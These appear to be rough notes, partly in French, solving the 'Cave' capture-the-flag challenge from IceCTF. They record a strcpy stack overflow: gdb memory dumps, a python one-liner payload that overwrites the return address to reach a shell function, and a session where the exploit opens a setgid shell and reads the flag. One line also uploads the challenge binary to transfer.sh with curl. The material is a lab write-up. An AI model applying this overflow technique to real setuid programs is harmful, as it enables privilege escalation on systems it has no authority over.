Cave

Description

You stumbled upon a cave! I've heard some caves hold secrets.. can you find the secrets hidden within its depths?







char buf[16];

break *0x08048591 main
break *0x0804856d   strcpy

# du fait qu'on passe le paramètre par ligne de commande
r aaaaaaaabbbbbbbbcccccccc

Destination 
0xffffd250 : 00 90 fa f7 00 90 fa f7 00 00 00 00 6b 3c e0 f7   ............k<..
0xffffd260 : fc 93 fa f7 00 00 00 00 88 d2 ff ff c2 85 04 08   ................


0xffffd250 : 61 61 61 61 61 61 61 61 62 62 62 62 62 62 62 62   aaaaaaaabbbbbbbb
0xffffd260 : 63 63 63 63 63 63 63 63 00 d2 ff ff c2 85 04 08   cccccccc........

fin de chaine en C 00



char *strcpy(char *s1, const char *s2); This function copies s2 into s1.

0804850b shell

"aaaaaaaabbbbbbbbccccccc"+"\xff\xff\xd2\x88"+"\x0b\x85\x04\x08"



`python -c 'print "aaaaaaaabbbbbbbbcccccccc"+"\x88\xd2\xff\xff"+"\x0b\x85\x04\x08"'`

dd 0xffffd210

0xffffd210 : 00 90 fa f7 00 90 fa f7 00 00 00 00 6b 3c e0 f7   ............k<..
0xffffd220 : fc 93 fa f7 00 00 00 00 48 d2 ff ff c2 85 04 08   ........H.......


[adversary ~]$ ls
cave
[adversary ~]$ ls -al
total 124
drwxr-xr-x. 1 adversary adversary  4096 Sep 13 08:23 .
drwxr-xr-x. 1 root      root       4096 Sep 11 11:01 ..
-rw-r--r--. 1 adversary adversary   220 May 15  2017 .bash_logout
-rw-r--r--. 1 adversary adversary  3526 May 15  2017 .bashrc
drwxr-xr-x. 2 root      root       4096 Sep 11 11:01 cave
drwxr-xr-x. 1 adversary adversary  4096 Sep 11 10:37 .oh-my-zsh
-rw-r--r--. 1 adversary adversary   675 May 15  2017 .profile
-rw-r--r--. 1 adversary adversary   101 Mar 12  2018 .vimrc
-rw-r--r--. 1 adversary adversary 40558 Sep 13 08:20 .zcompdump-dd17657d43c3-5.3.1
-rw-------. 1 adversary adversary    40 Sep 13 08:23 .zsh_history
-rw-r--r--. 1 adversary adversary   308 Mar 12  2018 .zshrc
[adversary ~]$ ls -l
total 8
drwxr-xr-x. 2 root root 4096 Sep 11 11:01 cave
[adversary ~]$ cd cave
[adversary ~/cave]$ ls -l
total 36
-r--r-----. 1 root caveman   48 Sep 11 11:01 flag.txt
-rw-r--r--. 1 root root     106 Sep 11 11:01 Makefile
-rwxr-sr-x. 1 root caveman 7496 Sep 11 11:01 shout
-rw-r--r--. 1 root root     501 Sep 11 11:01 shout.c
[adversary ~/cave]$ curl --upload-file shout https://transfer.sh/shoot
https://transfer.sh/QqV4r/shoot%[adversary ~/cave]$ ./shoot `python -c 'print "aaaaaaaabbbbbbbbcccccccc"+"\x88\xd2\xff\xff"+"\x0b\x85\x04\x08"'`
zsh: no such file or directory: ./shoot
[adversary ~/cave]$ ./shout `python -c 'print "aaaaaaaabbbbbbbbcccccccc"+"\x88\xd2\xff\xff"+"\x0b\x85\x04\x08"'`
The cave echoes.. aaaaaaaabbbbbbbbcccccccc����
                                              �
sh-4.4$ ls
flag.txt  Makefile  shout  shout.c
sh-4.4$ cd flag.txt
sh: cd: flag.txt: Not a directory
sh-4.4$ cat flag.txt
IceCTF{i_dont_think_cavemen_overflowed_buffers}
sh-4.4$ id
uid=1000(adversary) gid=1337(caveman) groups=1337(caveman)
sh-4.4$